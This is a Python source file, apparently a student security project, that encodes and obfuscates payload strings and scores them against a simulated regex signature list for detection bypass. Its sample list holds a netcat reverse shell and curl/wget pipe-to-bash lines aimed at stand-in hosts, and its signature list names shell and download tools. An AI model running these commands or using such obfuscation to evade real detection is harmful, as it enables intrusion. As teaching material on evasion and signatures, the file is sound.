#!/usr/bin/env python3
"""
============================================================
  Custom Payload Encoder & Obfuscation Framework
  Unified Mentor — Cybersecurity Project 2
============================================================
  Description : Educational framework for studying how payloads
                are encoded and obfuscated to study evasion
                techniques in a controlled lab environment.
  Tech Stack  : Python 3.x | base64 | random | re | argparse
  Usage       : python payload_framework.py [options]
                python payload_framework.py --help
============================================================
  DISCLAIMER  : This tool is strictly for educational and
                ethical security research purposes only.
                Do NOT use on production systems or without
                explicit written authorization.
============================================================
"""

import base64
import random
import string
import re
import json
import argparse
from datetime import datetime

# ═══════════════════════════════════════════════════════════
# MODULE 1 — ENCODING
# ═══════════════════════════════════════════════════════════

def encode_base64(payload: str) -> str:
    """Encode a payload string using Base64."""
    return base64.b64encode(payload.encode("utf-8")).decode("utf-8")


def decode_base64(payload: str) -> str:
    """Decode a Base64-encoded payload string."""
    try:
        return base64.b64decode(payload.encode("utf-8")).decode("utf-8")
    except Exception as e:
        return f"[ERROR] Base64 decode failed: {e}"


def encode_xor(payload: str, key: int = 0x41) -> str:
    """
    XOR-encode each character of the payload with the given key.
    Returns the result as a hex string for safe transport/storage.
    """
    xored = bytes([ord(ch) ^ key for ch in payload])
    return xored.hex()


def decode_xor(hex_payload: str, key: int = 0x41) -> str:
    """Decode an XOR-encoded hex string back to plaintext."""
    try:
        raw_bytes = bytes.fromhex(hex_payload)
        return "".join([chr(b ^ key) for b in raw_bytes])
    except Exception as e:
        return f"[ERROR] XOR decode failed: {e}"


def encode_rot13(payload: str) -> str:
    """
    Apply the ROT13 substitution cipher.
    Only shifts alphabetic characters; leaves others unchanged.
    ROT13 is its own inverse — apply twice to recover original.
    """
    result = []
    for ch in payload:
        if "a" <= ch <= "z":
            result.append(chr((ord(ch) - ord("a") + 13) % 26 + ord("a")))
        elif "A" <= ch <= "Z":
            result.append(chr((ord(ch) - ord("A") + 13) % 26 + ord("A")))
        else:
            result.append(ch)
    return "".join(result)


# ROT13 is self-inverse
decode_rot13 = encode_rot13


def encode_multilayer(payload: str, layers: list, xor_key: int = 0x41) -> str:
    """
    Apply multiple encoding techniques sequentially (layered encoding).
    layers: list of strings — 'base64', 'xor', 'rot13' in desired order.
    Example: ['rot13', 'base64'] applies ROT13 first, then Base64.
    """
    result = payload
    for layer in layers:
        if layer == "base64":
            result = encode_base64(result)
        elif layer == "xor":
            result = encode_xor(result, xor_key)
        elif layer == "rot13":
            result = encode_rot13(result)
        else:
            print(f"[WARN] Unknown layer '{layer}' — skipped.")
    return result


# ═══════════════════════════════════════════════════════════
# MODULE 2 — STRING OBFUSCATION
# ═══════════════════════════════════════════════════════════

def obfuscate_random_insert(payload: str,
                             noise_chars: str = None,
                             density: float = 0.25) -> str:
    """
    Insert random noise characters between payload characters.
    density : probability (0.0–1.0) of inserting a noise char after each char.
    Realistic tool use: breaks simple string matching signatures.
    """
    if noise_chars is None:
        noise_chars = string.punctuation.replace('"', "").replace("'", "")
    result = []
    for ch in payload:
        result.append(ch)
        if random.random() < density:
            result.append(random.choice(noise_chars))
    return "".join(result)


def obfuscate_split_concat(payload: str, min_chunk: int = 2,
                            max_chunk: int = 4) -> str:
    """
    Split payload into random-sized chunks and express as a
    string concatenation expression (Python-style).
    Defensive note: simple static scanners fail to reconstruct this.
    """
    chunk_size = random.randint(min_chunk, max_chunk)
    chunks = [
        payload[i : i + chunk_size]
        for i in range(0, len(payload), chunk_size)
    ]
    return " + ".join([f'"{chunk}"' for chunk in chunks])


def obfuscate_escape_sequences(payload: str, escape_ratio: float = 0.6) -> str:
    """
    Replace alphanumeric characters with their \\xHH hex escape sequences
    at the given ratio. Non-alphanumeric chars are left as-is.
    Breaks pattern-matching on plaintext character sequences.
    """
    result = []
    for ch in payload:
        if ch.isalnum() and random.random() < escape_ratio:
            result.append(f"\\x{ord(ch):02x}")
        else:
            result.append(ch)
    return "".join(result)


def obfuscate_reverse(payload: str) -> str:
    """
    Reverse the payload string.
    Trivially reversible, but bypasses left-to-right regex patterns.
    """
    return payload[::-1]


def deobfuscate_reverse(payload: str) -> str:
    """Recover original payload from a reversed obfuscation."""
    return payload[::-1]


def obfuscate_case_swap(payload: str) -> str:
    """
    Swap upper/lowercase of each alphabetic character.
    Effective against case-sensitive signature patterns.
    """
    return "".join(
        ch.upper() if ch.islower() else ch.lower() if ch.isupper() else ch
        for ch in payload
    )


# ═══════════════════════════════════════════════════════════
# MODULE 3 — EVASION TESTING (SIMULATED)
# ═══════════════════════════════════════════════════════════

# Simulated signature database — patterns based on common IOC keywords
# In a real EDR/AV, these would be hashed byte sequences or complex YARA rules.
SIGNATURE_DB = [
    r"cmd\.exe",
    r"/bin/sh",
    r"/bin/bash",
    r"powershell",
    r"wget\s+http",
    r"curl\s+http",
    r"exec\s*\(",
    r"eval\s*\(",
    r"base64_decode",
    r"nc\s+-[el]",
    r"meterpreter",
    r"reverse_tcp",
    r"bind_tcp",
    r"shellcode",
    r"exploit",
    r"netcat",
    r"invoke-expression",
    r"iex\s*\(",
    r"system\s*\(",
    r"os\.system",
    r"subprocess\.call",
    r"__import__",
]


def run_evasion_test(payload: str) -> dict:
    """
    Simulate basic signature-based detection against the given payload.
    Returns a result dictionary with verdict and matched signatures.
    """
    matched = []
    for sig in SIGNATURE_DB:
        if re.search(sig, payload, re.IGNORECASE):
            matched.append(sig.replace("\\", ""))

    detected = len(matched) > 0
    return {
        "detected": detected,
        "verdict": "DETECTED" if detected else "BYPASSED",
        "matched_signatures": matched,
        "signatures_checked": len(SIGNATURE_DB),
    }


# ═══════════════════════════════════════════════════════════
# MODULE 4 — REPORTING ENGINE
# ═══════════════════════════════════════════════════════════

def _truncate(text: str, limit: int = 100) -> str:
    return text if len(text) <= limit else text[:97] + "..."


def generate_report(original: str,
                    results: list,
                    xor_key: int = 0x41,
                    save_path: str = None) -> str:
    """
    Generate a structured text-based comparison report.

    Parameters
    ----------
    original  : The raw input payload string.
    results   : List of tuples: (label: str, encoded: str, evasion: dict)
    xor_key   : The XOR key used (for display purposes).
    save_path : If provided, write the report to this file.
    """
    SEP = "═" * 70
    THIN = "─" * 70

    lines = []
    lines += [
        SEP,
        "  CUSTOM PAYLOAD ENCODER & OBFUSCATION FRAMEWORK",
        "  Unified Mentor — Cybersecurity Project 2",
        f"  Report Generated : {datetime.now().strftime('%B %Y')}",
        f"  XOR Key          : 0x{xor_key:02X} ({xor_key})",
        SEP,
    ]

    # ── Original payload
    orig_evasion = run_evasion_test(original)
    lines += [
        "",
        "  [ORIGINAL PAYLOAD]",
        THIN,
        f"  Payload  : {original}",
        f"  Verdict  : {orig_evasion['verdict']}",
    ]
    if orig_evasion["matched_signatures"]:
        sigs = ", ".join(orig_evasion["matched_signatures"])
        lines.append(f"  Matched  : {sigs}")
    lines.append("")

    # ── Encoded / obfuscated variants
    lines += [SEP, "  ENCODING & OBFUSCATION RESULTS", SEP]

    for label, encoded, evasion in results:
        lines += [
            "",
            f"  [{label}]",
            THIN,
            f"  Output   : {_truncate(encoded)}",
            f"  Verdict  : {evasion['verdict']}",
        ]
        if evasion["matched_signatures"]:
            sigs = ", ".join(evasion["matched_signatures"])
            lines.append(f"  Matched  : {sigs}")

    # ── Summary table
    bypassed = sum(1 for _, _, e in results if not e["detected"])
    detected = len(results) - bypassed
    total = len(results)

    lines += [
        "",
        SEP,
        "  EVASION EFFECTIVENESS SUMMARY",
        SEP,
        "",
        f"  {'Technique':<40} {'Verdict':<12} {'Matches'}",
        "  " + THIN[2:],
    ]
    for label, _, evasion in results:
        match_count = len(evasion["matched_signatures"])
        lines.append(
            f"  {label:<40} {evasion['verdict']:<12} {match_count}"
        )

    lines += [
        "",
        "  " + THIN[2:],
        f"  Original Payload Detected  : {'YES ⚠' if orig_evasion['detected'] else 'NO'}",
        f"  Techniques Tested          : {total}",
        f"  Detection Bypassed         : {bypassed}/{total}  "
        f"({(bypassed / total * 100):.1f}%)",
        f"  Still Detected             : {detected}/{total}  "
        f"({(detected / total * 100):.1f}%)",
        "",
        SEP,
        "  END OF REPORT",
        SEP,
    ]

    report = "\n".join(lines)

    if save_path:
        with open(save_path, "w", encoding="utf-8") as fh:
            fh.write(report)
        print(f"\n  [*] Report saved → {save_path}")

    return report


# ═══════════════════════════════════════════════════════════
# FRAMEWORK RUNNER
# ═══════════════════════════════════════════════════════════

def run_full_pipeline(payload: str, xor_key: int = 0x41,
                      seed: int = 42, save_path: str = None) -> str:
    """
    Execute the complete encoding → obfuscation → evasion pipeline.

    Parameters
    ----------
    payload   : Raw payload string to process.
    xor_key   : Byte value used as XOR key.
    seed      : Random seed (default 42) for reproducible obfuscation output.
    save_path : Optional file path to write the report.

    Returns
    -------
    str : The complete formatted report.
    """
    random.seed(seed)
    results = []

    # ── Single-layer encodings
    b64 = encode_base64(payload)
    results.append(("Base64 Encoded", b64, run_evasion_test(b64)))

    xor_enc = encode_xor(payload, xor_key)
    results.append((f"XOR Encoded (key=0x{xor_key:02X})", xor_enc, run_evasion_test(xor_enc)))

    rot13 = encode_rot13(payload)
    results.append(("ROT13 Encoded", rot13, run_evasion_test(rot13)))

    # ── Multi-layer encodings
    b64_xor = encode_multilayer(payload, ["base64", "xor"], xor_key)
    results.append(("Base64 → XOR (multi-layer)", b64_xor, run_evasion_test(b64_xor)))

    rot13_b64 = encode_multilayer(payload, ["rot13", "base64"])
    results.append(("ROT13 → Base64 (multi-layer)", rot13_b64, run_evasion_test(rot13_b64)))

    xor_b64_rot = encode_multilayer(payload, ["xor", "base64", "rot13"], xor_key)
    results.append(("XOR → Base64 → ROT13 (3-layer)", xor_b64_rot,
                    run_evasion_test(xor_b64_rot)))

    # ── Obfuscation techniques
    rand_ins = obfuscate_random_insert(payload)
    results.append(("Obfuscation: Random Char Insertion", rand_ins,
                    run_evasion_test(rand_ins)))

    split_cat = obfuscate_split_concat(payload)
    results.append(("Obfuscation: Split & Concat", split_cat,
                    run_evasion_test(split_cat)))

    escaped = obfuscate_escape_sequences(payload)
    results.append(("Obfuscation: Hex Escape Sequences", escaped,
                    run_evasion_test(escaped)))

    reversed_p = obfuscate_reverse(payload)
    results.append(("Obfuscation: String Reversal", reversed_p,
                    run_evasion_test(reversed_p)))

    case_swapped = obfuscate_case_swap(payload)
    results.append(("Obfuscation: Case Swap", case_swapped,
                    run_evasion_test(case_swapped)))

    # ── Hybrid: encoding + obfuscation
    b64_then_escape = obfuscate_escape_sequences(encode_base64(payload))
    results.append(("Base64 + Escape Obfuscation (hybrid)", b64_then_escape,
                    run_evasion_test(b64_then_escape)))

    xor_then_split = obfuscate_split_concat(encode_xor(payload, xor_key))
    results.append(("XOR + Split-Concat Obfuscation (hybrid)", xor_then_split,
                    run_evasion_test(xor_then_split)))

    return generate_report(payload, results, xor_key, save_path)


# ═══════════════════════════════════════════════════════════
# CLI INTERFACE
# ═══════════════════════════════════════════════════════════

SAMPLE_PAYLOADS = [
    "cmd.exe /c powershell -exec bypass -nop -w hidden",
    "wget http://10.0.0.1/shell.sh | bash",
    "nc -e /bin/sh 192.168.1.10 4444",
    "python3 -c \"import os; os.system('/bin/bash')\"",
    "curl http://malicious.site/payload | bash",
]


def build_cli() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="payload_framework.py",
        description=(
            "Custom Payload Encoder & Obfuscation Framework\n"
            "Unified Mentor — Cybersecurity Project 2\n\n"
            "  Example usage:\n"
            '    python payload_framework.py -p "cmd.exe /c whoami"\n'
            '    python payload_framework.py --demo\n'
            '    python payload_framework.py --encode-only base64 -p "shellcode"\n'
            '    python payload_framework.py --decode base64 -p "c2hlbGxjb2Rl"\n'
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument(
        "-p", "--payload",
        type=str,
        default="cmd.exe /c powershell -exec bypass -nop -w hidden",
        help="Payload string to encode/obfuscate (wrap in quotes)",
    )
    parser.add_argument(
        "-k", "--xor-key",
        type=lambda x: int(x, 0),
        default=0x41,
        metavar="KEY",
        help="XOR key as int or hex (e.g. 0x41 or 65). Default: 0x41",
    )
    parser.add_argument(
        "-o", "--output",
        type=str,
        default=None,
        metavar="FILE",
        help="Save full report to a text file",
    )
    parser.add_argument(
        "--encode-only",
        choices=["base64", "xor", "rot13"],
        default=None,
        metavar="METHOD",
        help="Run a single encoding method and print the result",
    )
    parser.add_argument(
        "--decode",
        choices=["base64", "xor", "rot13"],
        default=None,
        metavar="METHOD",
        help="Decode payload using the given method",
    )
    parser.add_argument(
        "--demo",
        action="store_true",
        help="Run the full pipeline on all built-in sample payloads",
    )
    parser.add_argument(
        "--json",
        action="store_true",
        help="Export evasion results as JSON instead of text report",
    )
    return parser


def _export_json(payload: str, xor_key: int = 0x41) -> None:
    """Run the pipeline and print results as JSON."""
    random.seed(42)
    results = []

    encodings = {
        "base64":         encode_base64(payload),
        f"xor_0x{xor_key:02X}":  encode_xor(payload, xor_key),
        "rot13":          encode_rot13(payload),
        "multilayer_b64_xor": encode_multilayer(payload, ["base64", "xor"], xor_key),
        "multilayer_rot_b64": encode_multilayer(payload, ["rot13", "base64"]),
    }

    output = {
        "timestamp": datetime.now().isoformat(),
        "original_payload": payload,
        "original_evasion": run_evasion_test(payload),
        "encoded_variants": {},
    }

    for name, enc in encodings.items():
        output["encoded_variants"][name] = {
            "encoded": enc,
            "evasion": run_evasion_test(enc),
        }

    print(json.dumps(output, indent=2))


def main() -> None:
    parser = build_cli()
    args = parser.parse_args()

    # ── Single encode
    if args.encode_only:
        enc_map = {
            "base64": encode_base64,
            "rot13":  encode_rot13,
            "xor":    lambda p: encode_xor(p, args.xor_key),
        }
        print(enc_map[args.encode_only](args.payload))
        return

    # ── Single decode
    if args.decode:
        dec_map = {
            "base64": decode_base64,
            "rot13":  decode_rot13,
            "xor":    lambda p: decode_xor(p, args.xor_key),
        }
        print(dec_map[args.decode](args.payload))
        return

    # ── JSON export
    if args.json:
        _export_json(args.payload, args.xor_key)
        return

    # ── Demo mode — run all sample payloads
    if args.demo:
        for idx, sample in enumerate(SAMPLE_PAYLOADS, 1):
            print(f"\n{'━' * 70}")
            print(f"  SAMPLE PAYLOAD {idx}/{len(SAMPLE_PAYLOADS)}")
            print(f"{'━' * 70}")
            save = f"report_sample_{idx}.txt" if args.output else None
            report = run_full_pipeline(sample, args.xor_key, save_path=save)
            print(report)
        return

    # ── Full pipeline (default)
    report = run_full_pipeline(
        payload=args.payload,
        xor_key=args.xor_key,
        save_path=args.output,
    )
    print(report)


if __name__ == "__main__":
    main()
